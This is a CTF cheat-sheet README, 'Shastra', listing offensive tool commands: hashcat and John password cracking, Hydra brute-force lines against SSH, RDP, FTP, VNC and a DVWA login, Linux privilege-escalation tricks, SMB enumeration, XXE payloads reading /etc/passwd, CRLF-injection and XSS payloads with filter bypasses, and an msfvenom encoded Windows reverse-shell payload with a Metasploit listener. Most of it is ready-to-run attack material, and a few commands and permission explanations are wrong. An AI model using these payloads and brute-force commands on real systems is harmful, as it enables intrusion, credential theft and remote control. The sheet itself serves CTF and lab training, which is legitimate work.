# Shastra
Shashtra is a repo which tells how to use useful tools in CTF etc.

> roddshan 14 July 2021
---------------------

# Table of Contents
1. [Hashcat](#Hashcat)
2. [John](#John)
3. [Hydra](#Hydra)
4. [Privilege Esclation](#Privilege-Esclation)
5. [Linux Fundamentals](#Linux-Fundamentals)
6. [Samba](#Samba)
7. [Enum4linux](Enum4linux)
8. [XXE](#XXE)
9. [CRLF Injection](#CRLF-Injection)
10. [Forensics](#Forensics)
11. [Steghide](#Steghide)
12. [Metasploit](#Metasploit)

Hashcat
====================


    hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
 
 https://hashcat.net/wiki/doku.php?id=example_hashes

    -m 0 designates the type of hash we are cracking (MD5)
    
    -a 0 designates a dictionary attack
    
    -o cracked.txt is the output file for the cracked passwords
    
    target_hashes.txt is our input file of hashes
    
    /usr/share/wordlists/rockyou.txt is the absolute path to the wordlist file for this dictionary attack
    
    Visit this site for [type of hash] (https://hashcat.net/wiki/doku.php?id=example_hashes)
    
John
====================

    john hash.txt --show --wordlist=/usr/share/wordlist/rockyou.txt

**Converting id_rsa to hash**

    john /usr/share/john/john2ssh.py id_rsa > id_rsa.txt

Hydra
====================

SSH Bruteforce

    hydra -l username -P /usr/wordlist/rockyou.txt -t 4 ssh://ip_addr
    
    hydra -l admin -P passwordlist ssh://192.168.100.155 -V
    
    -l admin The small l here states that I am going to specify a username use a capital L if you are going to specify a user list.
    -P passwordlist The capital P here says I’m going to be specifying a list of passwords in a file called passwordlist.
    ssh://192.168.100.155 This is the service we want to attack and the IP address of the SSH server.
    -V Verbose this will display the login and password it tries in the terminal for each attempt.
    
RDP Bruteforce

    hydra -t 4 -V -f -l administrator -P rockyou.txt rdp://ip_addr
    
    **-t 4** This sets the number of tasks that can run parallel together in this example I have used 4 which will send 4 logins at a time. RDP does not like too         many connections at the same time so try and keep it at a maximum of 4. It is sometimes worth adding a -w to your command to add a wait 
    between attempts.
    **-V** – Verbose this shows you which usernames and passwords on screen as it’s working.
    **-f**  Quits once you have found a positive Username and Password match.
    **-l administrator** – Use the username administrator to attempt to login.
    **-P rockyou.txt**– This is the word list that we will be pulling passwords from.
    **rdp://192.168.34.16** – This is the service we want to attack and the IP address.
    
FTP Bruteforce

    hydra -t 5 -V -f -L userlist -P passwordlist ftp://192.168.34.16
    
    **-t 5** this sets the number of tasks or logins it will try simultaneously. I have gone for 5 here but just remember don’t go too high as it may give you false     results.
    **-V** Verbose this will display the login and password it tries in the terminal for each attempt/
    **-f** Quits once hydra has found a positive Username and Password match.
    **-L** userlist The capital -L  here means I’m using a wordlist of usernames called userlist if a -l was used this specifies a single username to try.
    **-P** passwordlist The capital -P here means I’m using a word list called passwordlist if a -p was used this specifies a single password to try.
    **ftp://192.168.34.16** This is the service we want to attack and the IP address of the FTP server
    
 VNC Bruteforce
 
     hydra -P passwordlist -t 1 -w 5 -f -s 5901 192.168.100.155 vnc -v
     
     -P passwordlist The capital -P here means I’m using a word list called passwordlist if a -p was used this specifies a single password to try.
    -t 1 This sets the number of tasks or logins it will try simultaneously. I have gone for 1 here but just remember don’t go higher than 4 for brute forcing VNC.
    -w 5 This sets the wait time between tries I have gone for 5 here but remember to go a lot higher if the blacklisting feature is still enabled
    -f Quits once hydra has found a positive Password match.
    -s 5901 This changes the default port for hydra to connect to the VNC server from 5900 to 5901 which was what my VNC server defaulted to.
    192.168.100.155 vnc This specifies the IP address of the VNC server and the service we want to attack.
    -v Verbose this will display the password it tries in the terminal for each attempt.
    
    
 Web Login Bruteforce
 
     hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"
     
     192.168.100.155 The target IP address of the server hosting the webpage
    -V Verbose this will display the login and password it tries in the terminal for each attempt.
    -l admin The small l here states that I am going to specify a username use a capital L if you are going to specify a user list.
    -P passwordlist The capital P here says I’m going to be specifying a list of passwords in a file called passwordlist.
    http-get-form Tells hydra that you are going to be using the http-get-form module.
    /dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login All these details were found in our tamper data request that we copied to our text editor.
    F=Username and/or password incorrect. This is the failed login message we received from the DVWA login page, this tells hydra when it’s not received we have a valid login.
    H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low This is the Cookie we were issued when we logged into the DVWA site at the start also found in the Tamper Data.
    
    
Privilege-Esclation 
====================
 
 Python
        python -c 'import pty; pty.spawn("/bin/bash")'
        sudo su
          
          
          
Through Service Creation

    $ eop=$(mktemp).service
    $ echo '[Service]
    > ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
    > [Install]
    > WantedBy=multi-user.target' > $eop
    $ /bin/systemctl link $eop
    Created symlink from /etc/systemd/system/tmp.dC4p9XdFGy.service to /tmp/tmp.dC4p9XdFGy.service.
    $ /bin/systemctl enable --now $eop
    Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.dC4p9XdFGy.service to /tmp/tmp.dC4p9XdFGy.service.
    $ cd /tmp
    $ ls -la
    $ cat output
    
    
    
Nmap

             $ nmap -V
             $ nmap --interactive
             nmap> !sh
             # whoami
             
             
 SUID
 
             find / -user root -perm -4000 -print 2>/dev/null
             find / -perm -u=s -type f 2>/dev/null
             find / -user root -perm -4000 -exec ls -ldb {} \;
             
             

    
Check editable files for the normal user and host file.


Linux-Fundamentals  
====================

      SSH
        ssh user@ip
       
Commands

        && Run two operations one after another                                                 cat abc && ls
        
        &  Run two operators but second one does not waits for first to finish                  cat abc & ls
        
        | Output of first commant is input of secind                                            cat psswd.txt | grep root
        
        $ the environment variables usually starts with $env_variable                           echo $USER
        
        ;  does not require first command to run sucessfully                                    djjcknj; ls
        
        > output to a file                                                                      echo hello > file.txt
        
        >> output to a file but with append                                                     echo hello >> file.txt
        
        
Changing the permission/groups of file

   chown                   chown new_user:new_group filename
        
        
   chmod                      chmod <permisson> file
    
                               Digit	Meaning
                                1	That file can be executed
                                2	That file can be written to
                                3	That file can be executed and written to
                                4	That file can be read
                                5	That file can be read and executed
                                6	That file can be written to and read
                                7	That file can be read, written to, and executed

                                Command:	Meaning
                                chmod 341 file	
                                                The file can be executed and written to by the user that owns the file

                                                The file can be read by the group that owns the file

                                                The file can be executed by everyone else.

                                chmod 777 file	
                                                The file can be read, written to, and executed by the user that owns the file

                                                The file can be read, written to, and executed by the group that owns the file

                                                The file can be read, written to, and executed by everyone else



                                chmod 455	
                                                The file can be read by the user that owns the file

                                                The file can be read and executed by the group that owns the file

                                                The file can be read to and executed by everyone else
                                                
  ln
     
        linking one file to another             ln file1 file2                  -s flag used to show linking
                        here file1 is linked to file2 means whatever change we do to file1, it will also be done in file2
                        
  find
   
                find /tmp dir -user           to list every file owned by a specific user
                find /tmp dir -group
                
                
      
      SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.
      

To search the a system for these type of files run the following: 

                        find . / -perm -u=s -type f -exec 2>/dev/null

Samba 
====================

SMB runs on port 139 or 445
Originally it was running on port 139 to communicate the computers on same network but after Win 2000 it runs on the top of TCP stack to communicate through 
internet.



Shares enumeration
              
              nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse ip_addr
              
              enum4linux ip_addr
              
Connecting to shares
              smbclient //ip_addr/share_name
              
              
Recursively download share
              smbget -R smb://<ip>/anonymous
              
RCP(remote call procedure) mount enumeration
              nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount ip_addr
              
              
searchsploit (Exploit search for exploit-db)
          searchsploit service version

Enum4linux
====================
    
      Enum4linux is a tool for enumerating information from Windows and Samba systems.

      **Ussage**
         enum4linux ip_address
         
XXE
==================== 
     
      Basic Payloads

      <!DOCTYPE replace [<!ENTITY name "feast"> ]>
      <userInfo>
      <firstName>falcon</firstName>
      <lastName>&name;</lastName>
      </userInfo>
 
 
 
      <?xml version="1.0"?>
      <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
      <root>&read;</root>
      
      
CRLF-Injection
====================

      A Carriage Return Line Feed (CRLF) Injection vulnerability occurs when an application does not sanitize 
      user input correctly and allows for the insertion of carriage returns and line feeds, input which for 
      many internet protocols, including HTML, denote line breaks and have special significance.
    
      For example, Parsing of HTTP message relies on CRLF characters **(%0D%0A which decoded represent \r\n)** 
      to identify sections of HTTP messages, including headers.
      
      - HTTP Response Splitting
        - /%0D%0ASet-Cookie:mycookie=myvalue
      
      - CRLF chained with Open Redirect
        - //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2                     
        -  /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2                       
        -  /google.com/%2F..%0D%0AHeader-Test:test2
        - /%0d%0aLocation:%20http://example.com
     
      - CRLF Injection to XSS
        - /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
        -/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
     
      -Filter Bypass
         - %E5%98%8A = %0A = \u560a
         - %E5%98%8D = %0D = \u560d
         - %E5%98%BE = %3E = \u563e (>)
         - %E5%98%BC = %3C = \u563c (<)
         - Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
 
Forensics
====================
  - Image Creator

        FTK Imager - Link
        Redline - Link *Requires registration but Redline has a very nice GUI
        DumpIt.exe
        win32dd.exe / win64dd.exe - *Has fantastic psexec support, great for IT departments if your EDR solution doesn't support this
      
      
      
 -Volatility
      Volatility is a tool for memory analysis.
      
      volatility -f MEMORY_FILE.raw imageinfo
      volatility -f MEMORY_FILE.raw --profile=PROFILE pslist
      volatility -f MEMORY_FILE.raw --profile=PROFILE netscan
      volatility -f MEMORY_FILE.raw --profile=PROFILE malfind -D <Destination Directory usually /tmp>
      volatility -f MEMORY_FILE.raw --profile=PROFILE --pid=PID dlldump -D <Destination Directory>
      
      
      
     Malware Analysis
      
     VirusTotal - (https://www.virustotal.com/gui/home/upload)
     
     Hybrid Analysis - (https://www.hybrid-analysis.com/)
     
     (https://github.com/stuxnet999/MemLabs)
     
     (https://otx.alienvault.com/)
     
     GUI version - (https://github.com/kevthehermit/VolUtility)
     
     
Steghide
====================

       Steghide  is  a steganography program that is able to hide
       data in various  kinds  of  image-  and  audio-files.  The
       color- respectivly sample-frequencies are not changed thus
       making the embedding resistant against first-order statistical tests.
       
       - Extract a file
        - steghide extract -sf Linux_logo.jpg
        - steghide extract -sf test.wav
        
       - Hide a file in audio file
        - steghide embed -cf test.wav -ef secret.odt
       
       - View info about the file
        - steghide info Linux_logo.jpg 
       
       - View encryption info in steghide
        - steghide –encinfo
        - 
        - steg --help
        - man steghide
     
NOTE: You need a passphrase to encrypt or decrypt a file
             

             
             

Metasploit
====================
           
Windows Reverse tcp
             
           msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
           
           Open Metasploit
           search exploit 
           use exploit/multi/handler
           set payload windows/shell/reverse_tcp
           show options
           set LHOST 172.16.104.130
           set LPORT 31337
           exploit
           

           
           
           
https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
        
https://github.com/JohnHammond/ctf-katana#readme
             
DoS
             
             https://gbhackers.com/kali-linux-tutorial-dos-attack/
             
             https://linuxhint.com/hping3/
             
             HOIC in Windows
             
        

             
             
             




    
    


    

 


